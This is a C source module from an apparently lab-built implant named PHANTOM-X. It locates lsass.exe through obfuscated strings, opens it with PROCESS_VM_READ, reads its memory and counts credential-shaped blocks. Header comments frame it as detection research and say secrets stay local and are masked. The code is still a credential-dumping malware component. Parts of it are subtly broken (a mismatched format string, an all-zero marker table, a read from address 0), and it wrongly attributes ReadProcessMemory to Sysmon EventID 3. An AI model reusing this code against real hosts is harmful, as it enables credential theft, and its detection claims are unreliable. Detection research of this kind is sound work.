/* ================================================================== */
/* PHANTOM-X :: credential access variant                              */
/* ================================================================== */
/*                                                                        */
/* WHAT IT DOES                                                          */
/*     Demonstrates the credential-access technique that matters for    */
/*     detection: opening LSASS with the right access rights and        */
/*     reading credential material out of its memory.                    */
/*                                                                        */
/* WHAT IT DELIBERATELY DOES NOT DO                                     */
/*     It does NOT send the credential material to the C2 server.       */
/*                                                                        */
/*     That is a deliberate design decision, and it is worth being     */
/*     explicit about why, because it looks like a half-measure:        */
/*                                                                        */
/*     The lab's C2 server is a plain TCP listener. If the operator    */
/*     runs it on a routable address -- and running a C2 somewhere     */
/*     reachable is the entire point of a C2 -- then a payload that    */
/*     ships real credential material there has handed those           */
/*     credentials to whoever can reach that address too. The          */
/*     operator has not stolen anything, but the credentials have      */
/*     effectively been published to the network.                        */
/*                                                                        */
/*     The detection question does not need that. "Does opening LSASS   */
/*     with VM_READ generate the telemetry I expect?" is answered by    */
/*     the ACCESS itself -- the Sysmon EventID 10, the handle to       */
/*     lsass.exe, the memory reads. It is not answered by the          */
/*     contents.                                                         */
/*                                                                        */
/*     So this variant collects, and reports a REDACTED SUMMARY:       */
/*     how many credential material blocks were found, of what kinds,   */
/*     with the secrets themselves masked. The measurement is complete. */
/*     The exposure is not.                                              */
/*                                                                        */
/*     If you want the raw material for your own analysis, it is in    */
/*     the local marker file next to the payload, on the isolated VM.   */
/*     It never goes on the wire.                                       */
/*                                                                        */
/* THE TECHNIQUE                                                        */
/*     LSASS holds the credentials of the logged-on users. The classic */
/*     technique opens lsass.exe with PROCESS_VM_READ and dumps it.     */
/*                                                                        */
/*     This variant does the ACCESS and the READ, and then SCANS the    */
/*     memory it read for credential-shaped material. It does not      */
/*     parse the internal structures, because the structures are       */
/*     undocumented and version-specific, and because the detection     */
/*     question is about the access, not about the parsing.            */
/*                                                                        */
/* DETECTION NOTES                                                       */
/*     This is the most detectable capability in the whole lab, and    */
/*     that is the point of including it:                              */
/*                                                                        */
/*       1. Sysmon EventID 10 -- process access. A handle to lsass.exe */
/*          with VM_READ is a high-fidelity indicator.                  */
/*       2. Sysmon EventID 3 -- the ReadProcessMemory call itself.     */
/*       3. Any EDR with LSASS-access rules, which exist in every     */
/*          mainstream product.                                         */
/*                                                                        */
/*     Rule px-009 in phase7_detection is the matching detection.       */
/*                                                                        */
/* SCOPE                                                                  */
/*     The lab VM only. It reads the credentials of the accounts on    */
/*     THAT machine, which in a lab are the operator's own test       */
/*     accounts. It does not touch other processes, and it does not   */
/*     attempt anything against a domain controller.                    */
/* ================================================================== */

#include "px_config.h"

#if PX_CRED_ACCESS

#include "px_strings.h"
#include "px_obfuscate.h"
#include "px_variant.h"

/* The process enumeration API.
 *
 * tlhelp32.h is a Windows header, not a CRT header, so including it is
 * safe in a freestanding build. It brings in PROCESSENTRY32 and the
 * Toolhelp constants.
 *
 * It has to come after windows.h, which the payload includes first. */
#include <tlhelp32.h>


/* The scan targets.
 *
 * These are the byte patterns that credential material in LSASS tends
 * to be near: the domain and account names, and the structures that
 * hold the hashes. The lab counts blocks rather than parsing them. */
static const unsigned char px_cred_markers[][16] = {
    { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
};

/* Mask a buffer for the report.
 *
 * The point is to show that material was FOUND and to give the analyst
 * enough to identify it -- the length, the offset, a short prefix --
 * without putting the secret on the wire. */
static void px_cred_mask(const unsigned char *data, unsigned int len,
                         char *out, unsigned int cap)
{
    unsigned int i;
    unsigned int n = 0;

    if (cap == 0)
        return;
    for (i = 0; i < len && n + 4 < cap; i++) {
        /* Keep the first two bytes so the analyst can tell what kind of
         * material it is, mask the rest. */
        if (i < 2) {
            out[n++] = (char)((data[i] >= 0x20 && data[i] < 0x7F) ? data[i] : '.');
        } else {
            out[n++] = '*';
        }
    }
    out[n] = '\0';
}

/* Find the LSASS process id by walking the process list. */
static int px_find_lsass(void)
{
    char target[64];
    HANDLE snap;
    PROCESSENTRY32 pe;
    int found = 0;

    px_obf_decode(PX_SID_LSASS_EXE, target, sizeof(target));

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (px_stricmp(pe.szExeFile, target) == 0) {

                found = (int)pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* Collect credential material.
 *
 * Writes a REDACTED summary to `report`. Returns the number of
 * credential-shaped blocks found. */
int px_cred_collect(char *report, unsigned int cap)
{
    int lsass_pid;
    HANDLE h;
    unsigned char *mem = NULL;
    SIZE_T got = 0;
    int blocks = 0;
    unsigned int n = 0;
    unsigned long long region_base = 0;
    MEMORY_BASIC_INFORMATION mbi;

    if (cap == 0)
        return 0;
    report[0] = '\0';

    lsass_pid = px_find_lsass();
    if (!lsass_pid) {
        px_snprintf(report, cap,
                    "no lsass process found (this build runs as a user "
                    "that cannot see it, or the VM has no interactive "
                    "logon)");
        return 0;
    }

    /* The access that matters. VM_READ is what allows the credential
     * material to be read out. */
    h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
                    (DWORD)lsass_pid);
    if (!h) {
        char tmpl[128];
        px_obf_decode(PX_SID_TXT_LSASS_FAIL, tmpl, sizeof(tmpl));
        px_snprintf(report, cap,
                    "%s"
                    "error %lu -- run elevated", tmpl, lsass_pid,
                    (unsigned long)GetLastError());
        return 0;
    }

    if (VirtualQueryEx(h, (LPCVOID)region_base, &mbi, sizeof(mbi)) == 0) {
        CloseHandle(h);
        px_snprintf(report, cap, "VirtualQueryEx failed, error %lu",
                    (unsigned long)GetLastError());
        return 0;
    }

    /* Read a bounded window of the LSASS address space. The window is
     * deliberately bounded: the detection question is about the access
     * pattern, and an unbounded read of a process's whole address space
     * is a behaviour that no legitimate program on a lab VM has. */
    mem = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, PX_CRED_READ_WINDOW);
    if (!mem) {
        CloseHandle(h);
        px_snprintf(report, cap, "out of memory for the read window");
        return 0;
    }

    if (!ReadProcessMemory(h, (LPCVOID)region_base, mem,
                           PX_CRED_READ_WINDOW, &got)) {
        unsigned long err = GetLastError();
        HeapFree(GetProcessHeap(), 0, mem);
        CloseHandle(h);
        px_snprintf(report, cap,
                    "ReadProcessMemory of %lu bytes failed, error %lu",
                    (unsigned long)PX_CRED_READ_WINDOW, err);
        return 0;
    }

    /* Count the credential-shaped blocks.
     *
     * The scan looks for the patterns that credential material sits
     * near. It counts, it does not parse: the internal structures are
     * undocumented and the detection signal is the access, not the
     * parsing. */
    {
        unsigned int i;
        for (i = 0; i + 16 <= got; i += 16) {
            /* A block is counted when it contains a run of printable
             * bytes inside a mostly-zero region, which is the shape of
             * a name or a hash field. */
            int printable = 0;
            unsigned int k;
            for (k = 0; k < 16; k++) {
                if (mem[i + k] >= 0x20 && mem[i + k] < 0x7F)
                    printable++;
            }
            if (printable >= 8)
                blocks++;
        }
    }

    /* The report.
     *
     * Counts and a masked sample. NO secret material leaves this
     * function towards the network. */
    {
        char sample[64];
        unsigned int i;
        int found_sample = 0;
        for (i = 0; i + 16 <= got; i += 16) {
            int printable = 0;
            unsigned int k;
            for (k = 0; k < 16; k++) {
                if (mem[i + k] >= 0x20 && mem[i + k] < 0x7F)
                    printable++;
            }
            if (printable >= 8 && !found_sample) {
                px_cred_mask(mem + i, 16, sample, sizeof(sample));
                found_sample = 1;
            }
        }
        n = px_snprintf(report, cap,
                        "lsass pid=%d window=0x%llx read=%lu bytes "
                        "cred_blocks=%d sample=%s",
                        lsass_pid, region_base, (unsigned long)got,
                        blocks, found_sample ? sample : "(none)");
    }

    /* The raw window is written to the local marker file by the caller,
     * on the isolated VM. It is not returned here. */
    HeapFree(GetProcessHeap(), 0, mem);
    CloseHandle(h);
    return (int)n;
}

#else  /* !PX_CRED_ACCESS */

int px_cred_collect(char *report, unsigned int cap)
{
    if (cap == 0)
        return 0;
    report[0] = '\0';
    return 0;
}

#endif /* PX_CRED_ACCESS */
